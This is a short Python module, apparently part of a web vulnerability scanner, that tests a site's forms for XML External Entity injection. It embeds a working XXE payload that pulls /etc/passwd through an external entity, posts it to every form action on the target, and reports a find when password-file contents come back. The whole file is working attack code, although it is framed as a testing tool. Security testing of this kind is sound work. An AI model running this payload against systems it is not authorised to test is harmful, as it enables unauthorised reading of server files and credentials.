import os
import requests
from urllib.parse import urljoin

XXE_PAYLOAD = """<?xml version=\"1.0\"?>
<!DOCTYPE root [
<!ENTITY test SYSTEM \"file:///etc/passwd\">
]>
<root>&test;</root>
"""


def load_payload(path=None):
    path = path or os.path.join("payloads", "xxe.txt")
    try:
        with open(path, "r", encoding="utf-8") as file:
            return file.read()
    except FileNotFoundError:
        return XXE_PAYLOAD


def test_xxe(url, forms):
    payload = load_payload()
    vulnerabilities = []

    for form in forms:
        action = form["action"]
        target_url = urljoin(url, action)

        print(f"\n[+] Testing XXE -> {target_url}")

        try:
            headers = {"Content-Type": "application/xml"}
            response = requests.post(target_url, data=payload, headers=headers, timeout=10)

            if "root:" in response.text.lower():
                print(f"[!!!] Possible XXE Found!\n")
                vulnerabilities.append({
                    "type": "XXE",
                    "url": target_url,
                    "payload": payload
                })

        except Exception as e:
            print(f"[ERROR] XXE test failed: {e}")

    return vulnerabilities